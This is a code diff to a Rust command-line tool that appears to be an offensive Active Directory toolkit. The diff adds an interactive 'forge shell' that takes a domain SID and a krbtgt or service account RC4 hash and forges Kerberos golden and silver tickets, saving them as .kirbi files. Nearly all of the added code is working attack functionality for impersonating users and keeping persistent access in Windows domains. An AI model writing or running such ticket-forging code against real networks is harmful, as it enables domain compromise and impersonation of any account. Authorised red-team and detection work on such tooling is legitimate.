@@ -127,6 +127,7 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
         max_retries: 1,
         reversible: false,
         compensation: None,
+        parallel_safe: false,
     };
 
     println!("  {} {}", ">".bright_black(), description.cyan());
@@ -947,6 +948,15 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
             banner::print_success(&format!("Silver ticket saved to: {}", output));
             0
         }
+        ForgeAction::Shell {
+            domain_sid,
+            krbtgt_hash,
+            krbtgt_aes256,
+            user,
+            rid,
+        } => {
+            return cmd_forge_shell(cli, &domain, domain_sid, krbtgt_hash, krbtgt_aes256.as_deref(), user.clone(), *rid).await;
+        }
         _ => run_forge_action(cli, &domain, action).await,
     }
 }
@@ -1144,9 +1154,192 @@ fn build_runner_action(
     Ok((runner_action, opts))
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-// cmd_crack â€” Hash Cracking
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+/// Interactive forge REPL — persistent ticket forging session
+#[cfg(feature = "forge")]
+#[allow(unused_variables)]
+async fn cmd_forge_shell(
+    _cli: &Cli,
+    domain: &str,
+    domain_sid: &str,
+    krbtgt_hash: &str,
+    _krbtgt_aes256: Option<&str>,
+    mut user: String,
+    mut rid: u32,
+) -> i32 {
+    use std::io::{self, Write};
+
+    let mut domain = domain.to_string();
+    let mut domain_sid = domain_sid.to_string();
+    let mut krbtgt_hash = krbtgt_hash.to_string();
+
+    banner::print_module_banner("FORGE SHELL");
+    println!("  {} Interactive forge REPL -- type 'help' for commands", ">".bright_black());
+    println!("  {} Context: {} @ {} (SID: {})", ">".bright_black(), user.cyan(), domain.cyan(), domain_sid.cyan());
+
+    fn print_help() {
+        println!("  Commands:");
+        println!("    golden [--user U] [--rid N] [--out F]                   Forge golden ticket");
+        println!("    silver <SPN> [--user U] [--rid N] [--out F] [--hash H]  Forge silver ticket");
+        println!("    set <key> <value>                                       Modify context");
+        println!("    show                                                    Display state");
+        println!("    help                                                    This message");
+        println!("    exit / quit                                             Leave shell");
+    }
+
+    fn print_state(domain: &str, domain_sid: &str, krbtgt_hash: &str, user: &str, rid: u32) {
+        println!("  Current state:");
+        println!("    domain:       {}", domain.cyan());
+        println!("    domain_sid:   {}", domain_sid.cyan());
+        let hlen = 8.min(krbtgt_hash.len());
+        println!("    krbtgt_hash:  {}...", krbtgt_hash[..hlen].cyan());
+        println!("    user:         {}", user.cyan());
+        println!("    rid:          {}", rid);
+    }
+
+    let stdin = io::stdin();
+    loop {
+        print!("forge> ");
+        io::stdout().flush().ok();
+        let mut line = String::new();
+        if stdin.read_line(&mut line).is_err() || line.trim().is_empty() {
+            continue;
+        }
+        let line = line.trim().to_string();
+        let parts: Vec<&str> = line.split_whitespace().collect();
+        if parts.is_empty() {
+            continue;
+        }
+        let cmd = parts[0];
+        let args = &parts[1..];
+
+        let mut flags = std::collections::HashMap::new();
+        let mut positional = Vec::new();
+        let mut i = 0;
+        while i < args.len() {
+            if args[i].starts_with("--") {
+                let key = args[i].trim_start_matches("--");
+                if i + 1 < args.len() && !args[i + 1].starts_with("--") {
+                    flags.insert(key.to_string(), args[i + 1].to_string());
+                    i += 2;
+                } else {
+                    flags.insert(key.to_string(), "true".to_string());
+                    i += 1;
+                }
+            } else {
+                positional.push(args[i].to_string());
+                i += 1;
+            }
+        }
+
+        let outfile = flags.get("out").cloned();
+
+        match cmd {
+            "exit" | "quit" => {
+                println!("  {} Exiting forge shell", ">".bright_black());
+                return 0;
+            }
+            "help" => print_help(),
+            "show" => print_state(&domain, &domain_sid, &krbtgt_hash, &user, rid),
+            "set" => {
+                if positional.is_empty() {
+                    println!("  {} Usage: set <key> <value>", ">".bright_black());
+                    continue;
+                }
+                let key = &positional[0];
+                let value = positional[1..].join(" ");
+                match key.as_str() {
+                    "domain" => {
+                        domain = value;
+                        println!("  {} domain set to {}", "+".green(), domain.cyan());
+                    }
+                    "domain_sid" => {
+                        domain_sid = value.clone();
+                        println!("  {} domain_sid set to {}", "+".green(), domain_sid.cyan());
+                    }
+                    "krbtgt_hash" => {
+                        krbtgt_hash = value.clone();
+                        println!("  {} krbtgt_hash set", "+".green());
+                    }
+                    "user" => {
+                        user = value.clone();
+                        println!("  {} user set to {}", "+".green(), user.cyan());
+                    }
+                    "rid" => {
+                        match value.parse::<u32>() {
+                            Ok(r) => {
+                                rid = r;
+                                println!("  {} rid set to {}", "+".green(), rid);
+                            }
+                            Err(_) => println!("  {} Invalid RID: {}", "!".red(), value),
+                        }
+                    }
+                    _ => println!("  {} Unknown key: {}. Known: domain, domain_sid, krbtgt_hash, user, rid", "!".red(), key),
+                }
+            }
+            "golden" => {
+                let g_user = flags.get("user").map_or(user.as_str(), |v| v.as_str());
+                let g_rid = flags.get("rid").and_then(|r| r.parse::<u32>().ok()).unwrap_or(rid);
+                let out = outfile.unwrap_or_else(|| format!("golden_{}.kirbi", g_user));
+
+                let s_key = match hex::decode(&krbtgt_hash) {
+                    Ok(k) if k.len() == 16 => k,
+                    _ => {
+                        println!("  {} krbtgt_hash must be 32 hex chars (16 bytes, RC4)", "!".red());
+                        continue;
+                    }
+                };
+
+                println!("  {} Forging Golden Ticket...", ">".bright_black());
+                match overthrone_core::proto::kerberos::forge_tgt(&domain, &domain_sid, g_user, g_rid, &s_key, 23) {
+                    Ok(tgt) => {
+                        let bytes = tgt.ticket.build();
+                        if let Err(e) = std::fs::write(&out, &bytes) {
+                            println!("  {} Failed to write: {}", "!".red(), e);
+                        } else {
+                            println!("  {} Golden ticket saved to: {}", "+".green(), out.cyan());
+                        }
+                    }
+                    Err(e) => println!("  {} Failed to forge golden ticket: {}", "!".red(), e),
+                }
+            }
+            "silver" => {
+                if positional.is_empty() {
+                    println!("  {} Usage: silver <SPN> [--user U] [--rid N] [--out F] [--hash H]", ">".bright_black());
+                    continue;
+                }
+                let spn = &positional[0];
+                let s_user = flags.get("user").map_or(user.as_str(), |v| v.as_str());
+                let s_rid = flags.get("rid").and_then(|r| r.parse::<u32>().ok()).unwrap_or(rid);
+                let hash_str = flags.get("hash").map_or(krbtgt_hash.as_str(), |v| v.as_str());
+                let out = outfile.unwrap_or_else(|| format!("silver_{}.kirbi", s_user));
+
+                let s_key = match hex::decode(hash_str) {
+                    Ok(k) if k.len() == 16 => k,
+                    _ => {
+                        println!("  {} Service hash must be 32 hex chars (16 bytes, RC4)", "!".red());
+                        continue;
+                    }
+                };
+
+                println!("  {} Forging Silver Ticket...", ">".bright_black());
+                match overthrone_core::proto::kerberos::forge_service_ticket(&domain, &domain_sid, s_user, s_rid, spn, &s_key, 23) {
+                    Ok(tgs) => {
+                        let bytes = tgs.ticket.build();
+                        if let Err(e) = std::fs::write(&out, &bytes) {
+                            println!("  {} Failed to write: {}", "!".red(), e);
+                        } else {
+                            println!("  {} Silver ticket saved to: {}", "+".green(), out.cyan());
+                        }
+                    }
+                    Err(e) => println!("  {} Failed to forge silver ticket: {}", "!".red(), e),
+                }
+            }
+            _ => {
+                println!("  {} Unknown command: {}. Type 'help' for available commands.", "!".red(), cmd);
+            }
+        }
+    }
+}
 
 pub async fn cmd_crack(
     _cli: &Cli,
